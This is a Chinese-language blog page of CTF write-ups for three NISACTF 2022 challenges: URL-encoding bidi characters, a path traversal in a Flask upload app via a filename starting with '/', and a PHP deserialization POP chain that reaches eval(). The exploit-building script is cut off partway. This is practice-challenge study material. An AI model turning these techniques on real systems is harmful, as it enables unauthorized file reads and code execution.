@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="[NISACTF 2022]checkin    如何在010editor复制16进制，Ctrl+Shift+c就可以复制16进制。 通过赛博厨子将16进制解码，再进行url编码就可以。       也可以写到文件里面通过脚本进行url编码： 1234567891011121314&lt;?phpfunction file_read($path)&#123;    $f &#x3D; fopen($path">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NISACTF 2022">
+<meta property="og:url" content="https://21346asz.github.io/CTFwp/NISACTF-2022/index.html">
+<meta property="og:site_name" content="wArn&#39;s blog">
+<meta property="og:description" content="[NISACTF 2022]checkin    如何在010editor复制16进制，Ctrl+Shift+c就可以复制16进制。 通过赛博厨子将16进制解码，再进行url编码就可以。       也可以写到文件里面通过脚本进行url编码： 1234567891011121314&lt;?phpfunction file_read($path)&#123;    $f &#x3D; fopen($path">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-06-22T05:04:23.000Z">
+<meta property="article:modified_time" content="2025-06-22T11:17:08.418Z">
+<meta property="article:author" content="wArn">
+<meta property="article:tag" content="CTFwp">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>NISACTF 2022</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/21346asz/21346asz.github.io">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/CTFwp/H&NCTF-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://21346asz.github.io/CTFwp/NISACTF-2022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&text=NISACTF 2022"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&is_video=false&description=NISACTF 2022"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NISACTF 2022&body=Check out this article: https://21346asz.github.io/CTFwp/NISACTF-2022/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&title=NISACTF 2022"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://21346asz.github.io/CTFwp/NISACTF-2022/&name=NISACTF 2022&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://21346asz.github.io/CTFwp/NISACTF-2022/&t=NISACTF 2022"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-checkin"><span class="toc-number">1.</span> <span class="toc-text">[NISACTF 2022]checkin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyupload"><span class="toc-number">2.</span> <span class="toc-text">[NISACTF 2022]babyupload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-babyserialize"><span class="toc-number">3.</span> <span class="toc-text">[NISACTF 2022]babyserialize</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NISACTF 2022
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wArn</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-22T05:04:23.000Z" class="dt-published" itemprop="datePublished">2025-06-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTFwp/">CTFwp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTFwp/" rel="tag">CTFwp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="NISACTF-2022-checkin"><a href="#NISACTF-2022-checkin" class="headerlink" title="[NISACTF 2022]checkin"></a>[NISACTF 2022]checkin</h2>
+
+
+
+<p><strong>如何在010editor复制16进制，Ctrl+Shift+c就可以复制16进制。</strong></p>
+<p>通过赛博厨子将16进制解码，再进行url编码就可以。</p>
+
+
+
+
+
+
+<p>也可以写到文件里面通过脚本进行url编码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_read</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$f</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data1</span> = <span class="title function_ invoke__">file_read</span>(<span class="string">&quot;./1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$data1</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$data2</span> = <span class="title function_ invoke__">file_read</span>(<span class="string">&quot;./2.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">rawurlencode</span>(<span class="variable">$data2</span>);</span><br><span class="line"><span class="comment"># %E2%80%AE%E2%81%A6%20Flag%21%E2%81%A9%E2%81%A6N1SACTF</span></span><br><span class="line"><span class="comment"># %E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6cuishiyuan</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h2>
+
+<p>泄露了源码</p>
+<p>先分析&#x2F;路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 文件上传到/upload目录。</span></span><br></pre></td></tr></table></figure>
+
+<p>接着分析&#x2F;upload路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files: </span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename: <span class="comment"># 文件中不能包含.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span class="number">403</span></span><br><span class="line">    conn = db() <span class="comment"># 跟进db()方法</span></span><br><span class="line">    cur = conn.cursor() <span class="comment"># 创建游标(用于执行SQL语句)</span></span><br><span class="line">    uid = uuid.uuid4().<span class="built_in">hex</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into files (id, path) values (?, ?)&quot;</span>, (uid, file.filename,)) <span class="comment">#execute执行sql语句</span></span><br><span class="line">    <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Duplicate file&quot;</span></span><br><span class="line">    conn.commit() <span class="comment">#提交当前改动结果(如果向表格插入语句，必须执行conn.commit语句)</span></span><br><span class="line"></span><br><span class="line">    file.save(<span class="string">&#x27;uploads/&#x27;</span> + file.filename)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/file/&#x27;</span> + uid) <span class="comment">#重定向到/file/uid路由</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>) <span class="comment"># 查看是否存在数据库</span></span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>: </span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>) <span class="comment">#建立与 SQLite 数据库文件的连接。</span></span><br><span class="line">    <span class="keyword">return</span> g_db <span class="comment"># 返回connection对象，进行后续操作；返回/upload路由。</span></span><br></pre></td></tr></table></figure>
+
+<p>分析&#x2F;file路由：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    conn = db()</span><br><span class="line">    cur = conn.cursor()</span><br><span class="line">    cur.execute(<span class="string">&quot;select path from files where id=?&quot;</span>, (<span class="built_in">id</span>,))</span><br><span class="line">    res = cur.fetchone() <span class="comment">#获取单行数据</span></span><br><span class="line">    <span class="keyword">if</span> res <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(res[0])</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(<span class="string">&quot;uploads/&quot;</span>, res[<span class="number">0</span>]), <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="comment"># res[0] 以/开头，uploads/会被省略</span></span><br><span class="line"><span class="comment"># 此题主要考察的是就是上面这个。</span></span><br></pre></td></tr></table></figure>
+
+<p>如果我们上传了一个文件名为&#x2F;flag，那么打开的时候，是打开的&#x2F;flag，而不是我们上传的&#x2F;uploads&#x2F;flag。</p>
+
+
+<p>题目做完了，我们看看其他知识点：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_first_request </span><span class="comment"># 第一次请求前执行一次，flask2.3被删除，flask2.2弃用</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>) <span class="comment"># 删除database.db</span></span><br><span class="line">    cur = db().cursor() <span class="comment"># 创建游标(用于执行sql语句)</span></span><br><span class="line">    cur.executescript(SCHEMA) <span class="comment"># 创建表格</span></span><br></pre></td></tr></table></figure>
+
+<p>做python这种题，就要一步一步审计代码，找漏洞。</p>
+<h2 id="NISACTF-2022-babyserialize"><a href="#NISACTF-2022-babyserialize" class="headerlink" title="[NISACTF 2022]babyserialize"></a>[NISACTF 2022]babyserialize</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">hint</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">checkcheck</span>(<span class="variable">$this</span>-&gt;txw4ever);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>; <span class="comment">//fun = &quot;sixsixsix&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>pop链如何找了，一般我们都先找能利用的漏洞，一般能利用的漏洞就是pop链的尾端，我们是从尾端一步一步给首推了。</p>
+<p>__invoke()方法里面有：eval()方法，我们将__invoke()作为末尾，如何触发__invoke()方法了，<strong>当尝试把对象当做函数调用时，就会触发__invoke()方法。</strong></p>
+<p>在Ilovetxw类的__toString()方法中，调用了$bb()方法，如果$bb被我们赋值为NISA实例化后的对象就会触发NISA类里面的__invoke方法。如何触发__toString()方法了，<strong>当把对象当做字符串使用时就会触发。</strong></p>
+<p>1.在NISA类的__wakeup()方法中，如果我们将fun赋值为Ilovetxw类的实例化对象时，对象和字符串进行弱比较，会进行类型的转换，这个时候将对象转换为字符串，就会触发Ilovetxw类的__toString()方法。</p>
+<p>2.在four类的__set()方法中，将a属性赋值为对象，strtolower只接受string类型，而这里接受了一个object类型的，就会触发Ilovetxw类的__toString()方法。如何触发__set()方法了，<strong>对不存在或者不可访问的变量进行赋值的话，就会自动调用。</strong> </p>
+<p>在NISA类的__call()方法中，对不可访问的fun进行赋值，触发__set方法。如何触发__call()方法了，<strong>对不存在的方法或者不可访问的方法进行调用时就会自动调用该方法。</strong></p>
+<p>在TianXiWei类的__wakeup()方法中，调用了TianXiWei中不存在的方法nisa，触发__call()方法。当调用unserialize方法时，会触发__wakeup()方法。到此就结束了。</p>
+<p>现在有两个pop链：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//include &quot;waf.php&quot;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;show_me_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>; <span class="comment">// 1 shell</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>; <span class="comment">//5 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>; <span class="comment">//4 four</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>; <span class="comment">// 2 NISA</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>; <span class="comment">//3 Ilovetxw</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span 